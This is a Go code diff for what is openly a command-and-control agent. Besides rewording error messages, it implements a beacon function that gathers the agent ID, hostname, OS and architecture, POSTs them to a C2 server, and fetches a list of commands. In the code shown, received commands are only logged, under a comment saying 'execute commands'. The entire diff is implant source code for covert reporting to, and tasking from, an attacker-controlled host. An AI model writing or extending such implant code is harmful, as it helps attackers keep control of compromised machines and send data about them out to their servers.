@@ -53,7 +53,7 @@ func register() error {
 	// prepare and send beacon data to C2
 	data, err := json.Marshal(&beacon)
 	if err != nil {
-		return fmt.Errorf("Failure encoding beacon data: %v", err)
+		return fmt.Errorf("Error encoding beacon data: %v", err)
 	}
 	body := bytes.NewReader(data)
 	request, err := http.NewRequest("POST", c2URL, body)
@@ -65,7 +65,7 @@ func register() error {
 	// get HTTP response from server
 	response, err := client.Do(request)
 	if err != nil {
-		return fmt.Errorf("Failure getting HTTP response: %v", err)
+		return fmt.Errorf("Error getting HTTP response: %v", err)
 	}
 	defer response.Body.Close()
 	if response.StatusCode != http.StatusOK {
@@ -97,7 +97,62 @@ func initRand() {
 }
 
 func beacon() error {
-	return nil
+	// create initial Beacon
+	agentBeacon := proto.Beacon{
+		AgentID:  agentID,
+		Hostname: hostname,
+		OS:       agentOS,
+		Arch:     agentArch,
+		Result:   "",
+	}
+
+	// send initial Beacon to server
+	data, err := json.Marshal(&agentBeacon)
+	if err != nil {
+		return fmt.Errorf("Error encoding beacon data: %v", err)
+	}
+	body := bytes.NewReader(data)
+	request, err := http.NewRequest("POST", c2URL+"/beacon", body)
+	request.Header.Add("Content-Type", "application/json")
+
+	// grab server response
+	response, err := client.Do(request)
+	if err != nil {
+		return fmt.Errorf("Error sending beacon data: %v", err)
+	}
+	defer response.Body.Close()
+
+	responsePayload := proto.Response{}
+
+	// agent action depending on HTTP response
+	switch response.StatusCode {
+	case http.StatusOK:
+		// retrieve commands into responsePayload
+		responseBody, err := io.ReadAll(response.Body)
+		if err != nil {
+			return fmt.Errorf("Error reading server response body: %v", err)
+		}
+		if err = json.Unmarshal(responseBody, &responsePayload); err != nil {
+			return fmt.Errorf("Error parsing commands into Response struct: %v", err)
+		}
+		if len(responsePayload.Commands) == 0 {
+			return nil
+		}
+
+		// execute commands
+		for _, command := range responsePayload.Commands {
+			log.Printf("TASK RECEIVED: ID %s, Action: %s, Args: %s", command.TaskID, command.Action, command.Arguments)
+		}
+		return nil
+	case http.StatusNoContent:
+		return nil
+	default:
+		responseBody, err := io.ReadAll(response.Body)
+		if err != nil {
+			return fmt.Errorf("Error reading server response body: %v", err)
+		}
+		return fmt.Errorf("Could not connect to server. HTTP status code %d: %s", response.StatusCode, responseBody)
+	}
 }
 
 func main() {
